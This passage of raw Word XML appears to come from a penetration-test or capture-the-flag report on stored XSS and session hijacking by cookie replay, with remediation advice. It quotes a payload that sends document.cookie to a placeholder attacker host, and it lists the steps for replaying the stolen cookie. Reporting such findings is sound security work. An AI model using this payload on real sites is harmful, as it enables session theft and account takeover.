      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Summa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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="14"/>
          <w:w w:val="13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ured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’s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ss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on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cookie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ng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-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e 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cr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ing (XS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).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="95"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oo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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/C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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mma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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>U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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>XSS payload: &lt;p&gt;Great job, team!&lt;/p&gt;&lt;script&gt;new</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="2"/>
        <w:ind w:left="216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404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Image().src="http://&lt;kali_IP&gt;/?cookie="</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1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404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>+ document.cookie;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>omm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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nit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ze web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pp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nput.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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or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a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ert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us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ut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TT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/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H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TT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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ct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iv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y.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>7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.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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Ses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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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n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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>H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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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k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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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v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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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a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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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C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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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okie R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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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pl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a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y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fl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g 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ent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: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FL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G{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4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3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421b7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9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18}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="18"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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isk Rat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ng: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ium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| C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VS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e: 6.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Summa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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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eplayed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v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sion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c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kie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o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mper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 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er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gain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4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ic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ed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f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l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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="100"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oo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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/C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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mma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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>U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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Cap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ured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 xml:space="preserve">kie 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v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ia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XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Inject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okie in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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o b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ow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er s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orage</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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cc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`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m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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nn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e_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1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spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>php`</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>omm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
